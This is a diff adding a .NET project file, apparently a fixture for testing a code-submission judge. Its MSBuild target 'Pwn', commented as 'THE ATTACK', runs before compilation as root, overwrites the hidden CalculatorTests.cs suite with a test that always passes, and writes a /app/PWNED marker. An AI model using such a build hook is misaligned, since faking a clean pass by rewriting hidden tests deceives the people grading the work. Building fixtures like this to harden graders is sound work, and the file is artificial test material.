@@ -1,0 +1,28 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <TargetFramework>net9.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+  </PropertyGroup>
+
+  <!--
+    This csproj is the only file of this project baked into the judge image; the sources are excluded by
+    .dockerignore and supplied by the submission at run time. Contracts comes in as a package, which is the
+    seam that lets the folder be swapped wholesale.
+  -->
+  <ItemGroup>
+    <PackageReference Include="JudgeFixture.Contracts" Version="1.0.0" />
+  </ItemGroup>
+
+  <!--
+    THE ATTACK. MSBuild runs this before compiling, as root, and build_tests compiles the swapped folder before
+    the hidden suite. Overwriting the suite with a trivially-passing one used to yield a clean full pass that
+    nothing server-side could distinguish from real work.
+  -->
+  <Target Name="Pwn" BeforeTargets="Build">
+    <Exec Command="find /app -name 'CalculatorTests.cs' -exec sh -c 'printf \"using Xunit;\npublic class CalculatorTests { [Fact] public void P() { Assert.True(true); } }\n\" > {} ' \\;" ContinueOnError="true" />
+    <Exec Command="touch /app/PWNED" ContinueOnError="true" />
+  </Target>
+
+</Project>
